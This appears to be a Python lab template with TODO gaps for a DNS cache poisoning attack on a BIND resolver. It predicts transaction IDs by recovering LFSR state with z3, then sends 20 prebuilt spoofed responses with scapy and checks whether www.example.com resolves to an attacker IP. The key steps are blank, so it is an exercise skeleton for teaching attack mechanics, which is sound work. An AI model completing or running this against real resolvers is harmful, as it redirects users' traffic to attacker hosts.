import time
import socket
import struct
import threading


import z3
from common_library import *
from scapy.all import *


thread = threading.Thread(target=run_auth_server, daemon=True)
thread.start()

time.sleep(0.5)
print("[*] 1) Triggering chain via BIND at {}...".format(target_dns))
#TODO send a request so that it trigger a chain of to the attacker's
# authoritative server, which will allow us to leak multiple TXIDs.

#END TODO
print("[*] 2) Leaked the following TXIDs: {}".format(TXIDS))
thread.join(timeout=1)

print("[*] 3) Analyzing leaked TXIDs to find initial states...")
state_1, state_2 = find_initial_states(TXIDS)



print("[*] 4) First query, just to get the resolver to cache the NS record for example.com...")
#TODO

#END TODO
print(ans.show() if ans else "No answer received")


print("[*] 5) Sniffing for leaked TXID and target port...")
#TODO

#END TODO
print("[*] 6) Advancing LFSR states to align with leaked TXID...")
while True:
    state_1, state_2, tz = step_cross(state_1, state_2)
    if tz == leaked_txid:
        break

#TODO BUILD a trigger query for "www.example.com" 

#END TODO
trigger_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
#prebuild query to speed up the attack, since we need to send 20 responses as fast as possible
to_send =[trigger_query]
for i in range(20):
    #TODO prebuild the spoofed responses for the next 20 TXIDs, using the step_cross function to get the correct TXID for each response.

    #END TODO
    to_send.append(pkt)

print("[*] 7) Sending and spoofing responses.")
send(to_send, verbose=0)
print("[*] 8) Verifying if the cache is poisoned...")
test_query = build_spoofed_dns_request(attacker_ip, 12345, 53, "www.example.com.", "A")
ans = sr1(test_query, timeout=10, verbose=0)
print(ans.show() if ans else "No answer received")

if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")